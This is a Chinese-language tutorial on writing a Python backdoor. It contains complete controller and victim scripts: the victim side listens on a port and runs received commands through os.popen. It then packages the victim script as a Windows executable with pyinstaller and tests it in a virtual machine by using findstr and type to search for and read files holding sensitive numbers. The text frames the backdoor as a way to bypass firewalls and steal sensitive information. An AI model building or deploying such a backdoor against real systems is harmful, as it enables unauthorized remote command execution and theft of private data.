前言

本篇文章講解如何編寫後門程序，並實踐測試運行，通過後門程序查找文件。



後門基本概念


防火牆用於攔截用戶從外部訪問服務器。訪問服務器的Telnet、FTP等服務只限允許的用戶使用。防火牆並不會阻斷用戶從內部向外部的訪問路徑。雖然很難從外部侵入防火牆，但一旦成功，黑客就能輕鬆竊取敏感信息。後門技術用於繞過防火牆等安全設備，掌控服務器資源。安裝於目標服務器的後門客戶端會接收並運行來自後門服務器的命令，並將運行結果發送給後門服務器。

利用後門發動攻擊時，最困難的是向目標系統安裝後門客戶端。通過網絡直接上傳文件並非易事，所以這種手段大多用於安全性較差的Web環境。


後門攻擊端

 import socketip = "192.168.1.10"  # 對方服務器ip地址port = 5555  # 對方服務器的端口s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # 鏈接對方使用tcp協議 對象建立s.connect((ip, port))  # 連接while True:    data = input("請輸入命令：")    data = bytes(data, encoding="utf8")    s.send(data)  # 發送數據給對方    data2 = s.recv(1024)  # 接收返回的數據    print(str(data2, encoding="utf8"))    if data == b"q":        breaks.close()


後門受攻擊端

import socketimport osip = ""  # 空表示可連接所有主機port = 5555  # 設置端口s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # 對象s 使用基於tcp協議的網絡套接字s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # 關閉後不需要保存狀態可以立即開啟s.bind((ip, port))  # 對象s 開始綁定ip和端口s.listen(10)  # 啟動監聽狀態，設置隊列中等待連接服務器的最大請求數10conn, addr = s.accept()  # 當與別人建立連接 addr,conn 變量分別存對方ip和連接的對象print(addr)  # 顯示對方地址while True:    data = conn.recv(1024)  # 接收對方字符串 #如果對方不發數據會卡住    print(data)  # 打印對方發來的數據    if data == b"q":        break    data = str(data, encoding="utf8")  # 將數據轉換為字符串類型    f = os.popen(data)  # 可以將命令的內容以讀取的方式返回    data2 = f.read()    if data2 == "":        conn.send(b"finish")    else:        conn.send(bytes(data2, encoding="utf8"))  # 發送命令運行結果conn.close()  # 斷開連接s.close()  # 關閉套結字


創建Windows可執行文件


由於並不是所有被攻擊對象都安裝python環境，所以需要把python程序封裝成可執行文件，

詳見->https://mp.weixin.qq.com/s/Q0D1DzVPit3NX8DRWHrA2g


在桌面所在路徑運行命令，則生成的文件就在桌面，運行下面代碼，將受控端（受攻擊端）封裝。

pyinstaller -F D:\應用程序\Python\Python代碼\學習練習\後門受控端.py


測試

攻擊端IP：192.168.1.5

受攻擊端IP：192.168.1.10

（1）將剛才封裝完成的exe文件（dist文件夾中）複製到Windows7虛擬機（受攻擊端）中，雙擊運行，然後在攻擊機中運行攻擊端代碼，這裡我是在pycharm中運行。連接成功後，在pycharm輸入命令dir，就可看到受控端exe文件所在路徑下的所有文件和路徑了。其中<DIR>表示文件夾。(命令要使用英文)



（2）假設在受控端有文件中包含號碼等敏感信息，我們可以輸入如下命令


findstr "號碼" *.txt

查找當前路徑下的所有txt後綴名的文件中是否包含“號碼”字符，也可以用如下命令指定查找的文件夾。


findstr -d:新建文件夾 "號碼" *.txt

使用type命令打開文件，查看文件信息。


type 新建文件夾\t2.txt
